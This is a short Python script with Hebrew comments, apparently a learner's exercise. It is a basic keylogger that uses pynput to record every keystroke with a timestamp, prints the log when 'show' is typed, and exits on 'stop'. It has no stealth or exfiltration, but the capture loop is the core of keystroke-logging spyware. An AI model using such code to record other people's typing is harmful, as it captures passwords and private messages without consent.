from os import remove
from datetime import datetime
from collections import defaultdict
list1 = []
import time
list3 = []
dicti = {}
from pynput.keyboard import Listener
#הפיכת כל תו לפעולה על המסך
def prees_cadarush(key):
    key = str(key).replace("'", "")
    if key == 'Key.space':
       key = ' '
    if key == 'Key.enter':
        key = '\n'
    if key == 'Key.up':
        key = ''
    if key == 'Key.right':
        key = ' '
    if key == 'Key.left':
        key = ''
    if key == 'Key.down':
        key = '\n'
    if key == 'Key.ctrl_l':
        key = 'ctrl '
    if key == '\\x03':
        key = 'copy '
    if key == 'Key.backspace':
        key = ''
    if key == '\\x18':
        key = 'cut '
    if key == '\\x16':
        key = 'paste '

#יצירת 4 רשימות ומילון כדי למלא את הקלט והזמן כדרוש
    list1.append(key)
    list2 = ''.join(list1)
    list3.append(datetime.now().strftime('%d-%m-%y %H:%M'))
    if "show" in list2 :
        dicti= defaultdict(list)
        for k,v in zip(list3,list1):
           dicti[k].append(v)
           list4 = list(dicti.items())
           list4 = str(list4).replace("'","").replace(",","")
        print(list4)
        list1.clear()
#עצירת התוכנה
    if "stop" in list2:
       Listener.stop()
       print("the end good bye")
#הפעלת הת וכנה
with Listener(on_press=prees_cadarush) as Listener:
     Listener.join()